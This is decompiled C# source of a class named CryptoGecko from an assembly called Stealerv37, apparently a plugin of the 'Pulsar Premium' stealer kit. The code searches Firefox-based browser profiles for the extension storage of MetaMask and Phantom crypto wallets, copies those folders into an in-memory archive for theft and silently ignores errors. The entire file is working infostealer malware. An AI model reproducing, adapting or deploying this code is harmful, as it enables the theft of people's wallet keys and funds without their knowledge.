// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Browsers.CryptoGecko
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Targets.Browsers;

public class CryptoGecko : ITarget
{
  private readonly List<string[]> GeckoWalletsDirectories = new List<string[]>()
  {
    new string[2]
    {
      "Metamask Wallet",
      "7d61b592-e488-4f55-bf12-8d0ae55fd100"
    },
    new string[2]
    {
      "Metamask Wallet",
      "bb29e575-946e-4e69-b956-f73aec0a9927"
    },
    new string[2]
    {
      "Phantom Wallet",
      "e212a176-a331-462c-a024-d2f9027f15fc"
    },
    new string[2]
    {
      "Phantom Wallet",
      "a02b2aab-5dca-4649-93cf-f6a34860fbd5"
    }
  };

  public void Collect(InMemoryZip zip, Counter counter)
  {
    Parallel.ForEach<string>((IEnumerable<string>) Paths.Gecko, (Action<string>) (browser =>
    {
      if (!Directory.Exists(browser))
        return;
      Parallel.ForEach<string>((IEnumerable<string>) Directory.GetDirectories(browser), (Action<string>) (profile =>
      {
        string browsername = Paths.GetBrowserName(browser);
        string profilename = Path.GetFileName(profile);
        Task.Run((Action) (() => this.GetGeckoWallets(zip, counter, profile, profilename, browsername)));
      }));
    }));
  }

  private void GetGeckoWallets(
    InMemoryZip zip,
    Counter counter,
    string profilePath,
    string profilename,
    string browserName)
  {
    string extensionsPath = Path.Combine(profilePath, "storage", "default");
    if (!Directory.Exists(extensionsPath))
      return;
    Parallel.ForEach<string[]>((IEnumerable<string[]>) this.GeckoWalletsDirectories, (Action<string[]>) (walletInfo =>
    {
      foreach (string directory in Directory.GetDirectories(extensionsPath, $"moz-extension+++{walletInfo[1]}*", SearchOption.TopDirectoryOnly))
      {
        try
        {
          string targetEntryDirectory = $"{browserName}_{profilename} {walletInfo[0]}";
          zip.AddDirectoryFiles(directory, targetEntryDirectory);
          counter.CryptoChromium.Add($"{directory} => {targetEntryDirectory}");
        }
        catch
        {
        }
      }
    }));
  }
}
